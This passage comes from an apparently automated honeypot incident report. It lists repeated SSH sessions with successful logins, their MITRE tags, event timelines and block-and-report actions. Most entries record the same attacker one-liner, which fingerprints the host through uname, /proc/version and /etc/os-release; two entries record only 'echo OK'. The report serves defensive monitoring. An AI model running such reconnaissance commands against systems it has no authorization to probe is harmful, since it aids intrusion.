| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:17:26` | `cowrie.session.connect` |
| `2026-07-05 03:17:27` | `cowrie.client.version` |
| `2026-07-05 03:17:27` | `cowrie.client.kex` |
| `2026-07-05 03:17:30` | `cowrie.login.success` |
| `2026-07-05 03:17:31` | `cowrie.session.params` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.success` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:31` | `cowrie.command.input` |
| `2026-07-05 03:17:32` | `cowrie.log.closed` |
| `2026-07-05 03:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b880e1248578

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:18 |
| **Last Seen** | 2026-07-05 03:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:18:59` | `cowrie.session.connect` |
| `2026-07-05 03:18:59` | `cowrie.client.version` |
| `2026-07-05 03:18:59` | `cowrie.client.kex` |
| `2026-07-05 03:19:02` | `cowrie.login.success` |
| `2026-07-05 03:19:03` | `cowrie.session.params` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.success` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.command.input` |
| `2026-07-05 03:19:03` | `cowrie.log.closed` |
| `2026-07-05 03:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13ad07ca2efb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 03:19 |
| **Last Seen** | 2026-07-05 03:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:19:19` | `cowrie.session.connect` |
| `2026-07-05 03:19:20` | `cowrie.client.version` |
| `2026-07-05 03:19:20` | `cowrie.client.kex` |
| `2026-07-05 03:19:26` | `cowrie.login.success` |
| `2026-07-05 03:19:29` | `cowrie.session.params` |
| `2026-07-05 03:19:29` | `cowrie.command.input` |
| `2026-07-05 03:19:31` | `cowrie.log.closed` |
| `2026-07-05 03:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69533b056954

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:20 |
| **Last Seen** | 2026-07-05 03:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:20:31` | `cowrie.session.connect` |
| `2026-07-05 03:20:32` | `cowrie.client.version` |
| `2026-07-05 03:20:32` | `cowrie.client.kex` |
| `2026-07-05 03:20:35` | `cowrie.login.success` |
| `2026-07-05 03:20:37` | `cowrie.session.params` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.success` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:37` | `cowrie.command.input` |
| `2026-07-05 03:20:39` | `cowrie.log.closed` |
| `2026-07-05 03:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2081ee2915a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:22 |
| **Last Seen** | 2026-07-05 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:22:03` | `cowrie.session.connect` |
| `2026-07-05 03:22:04` | `cowrie.client.version` |
| `2026-07-05 03:22:04` | `cowrie.client.kex` |
| `2026-07-05 03:22:06` | `cowrie.login.success` |
| `2026-07-05 03:22:08` | `cowrie.session.params` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.success` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:08` | `cowrie.command.input` |
| `2026-07-05 03:22:09` | `cowrie.log.closed` |
| `2026-07-05 03:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b806f5eb1cfe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:23 |
| **Last Seen** | 2026-07-05 03:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:23:34` | `cowrie.session.connect` |
| `2026-07-05 03:23:34` | `cowrie.client.version` |
| `2026-07-05 03:23:34` | `cowrie.client.kex` |
| `2026-07-05 03:23:37` | `cowrie.login.success` |
| `2026-07-05 03:23:39` | `cowrie.session.params` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.success` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:39` | `cowrie.command.input` |
| `2026-07-05 03:23:41` | `cowrie.log.closed` |
| `2026-07-05 03:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bf70fd6f553

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:25 |
| **Last Seen** | 2026-07-05 03:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:25:05` | `cowrie.session.connect` |
| `2026-07-05 03:25:06` | `cowrie.client.version` |
| `2026-07-05 03:25:06` | `cowrie.client.kex` |
| `2026-07-05 03:25:10` | `cowrie.login.success` |
| `2026-07-05 03:25:14` | `cowrie.session.params` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.success` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:14` | `cowrie.command.input` |
| `2026-07-05 03:25:15` | `cowrie.log.closed` |
| `2026-07-05 03:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8df5cefee46

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:26 |
| **Last Seen** | 2026-07-05 03:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:26:37` | `cowrie.session.connect` |
| `2026-07-05 03:26:38` | `cowrie.client.version` |
| `2026-07-05 03:26:38` | `cowrie.client.kex` |
| `2026-07-05 03:26:41` | `cowrie.login.success` |
| `2026-07-05 03:26:42` | `cowrie.session.params` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.success` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:42` | `cowrie.command.input` |
| `2026-07-05 03:26:43` | `cowrie.log.closed` |
| `2026-07-05 03:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ce89f637c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:28 |
| **Last Seen** | 2026-07-05 03:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:28:10` | `cowrie.session.connect` |
| `2026-07-05 03:28:10` | `cowrie.client.version` |
| `2026-07-05 03:28:10` | `cowrie.client.kex` |
| `2026-07-05 03:28:13` | `cowrie.login.success` |
| `2026-07-05 03:28:14` | `cowrie.session.params` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.success` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:14` | `cowrie.command.input` |
| `2026-07-05 03:28:15` | `cowrie.log.closed` |
| `2026-07-05 03:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c29e9fa520e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:29 |
| **Last Seen** | 2026-07-05 03:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:29:40` | `cowrie.session.connect` |
| `2026-07-05 03:29:41` | `cowrie.client.version` |
| `2026-07-05 03:29:41` | `cowrie.client.kex` |
| `2026-07-05 03:29:44` | `cowrie.login.success` |
| `2026-07-05 03:29:46` | `cowrie.session.params` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.success` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:46` | `cowrie.command.input` |
| `2026-07-05 03:29:47` | `cowrie.log.closed` |
| `2026-07-05 03:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152c3030be20

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 03:30 |
| **Last Seen** | 2026-07-05 03:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:30:51` | `cowrie.session.connect` |
| `2026-07-05 03:30:52` | `cowrie.client.version` |
| `2026-07-05 03:30:52` | `cowrie.client.kex` |
| `2026-07-05 03:30:59` | `cowrie.login.success` |
| `2026-07-05 03:31:02` | `cowrie.session.params` |
| `2026-07-05 03:31:02` | `cowrie.command.input` |
| `2026-07-05 03:31:05` | `cowrie.log.closed` |
| `2026-07-05 03:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d1cea06e9b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:31 |
| **Last Seen** | 2026-07-05 03:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:31:10` | `cowrie.session.connect` |
| `2026-07-05 03:31:10` | `cowrie.client.version` |
| `2026-07-05 03:31:10` | `cowrie.client.kex` |
| `2026-07-05 03:31:13` | `cowrie.login.success` |
| `2026-07-05 03:31:14` | `cowrie.session.params` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.success` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:14` | `cowrie.command.input` |
| `2026-07-05 03:31:15` | `cowrie.log.closed` |
| `2026-07-05 03:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6527079aaaec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:32 |
| **Last Seen** | 2026-07-05 03:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:32:41` | `cowrie.session.connect` |
| `2026-07-05 03:32:42` | `cowrie.client.version` |
| `2026-07-05 03:32:42` | `cowrie.client.kex` |
| `2026-07-05 03:32:44` | `cowrie.login.success` |
| `2026-07-05 03:32:46` | `cowrie.session.params` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.success` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:46` | `cowrie.command.input` |
| `2026-07-05 03:32:47` | `cowrie.log.closed` |
| `2026-07-05 03:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03266babe6c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:34 |
| **Last Seen** | 2026-07-05 03:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
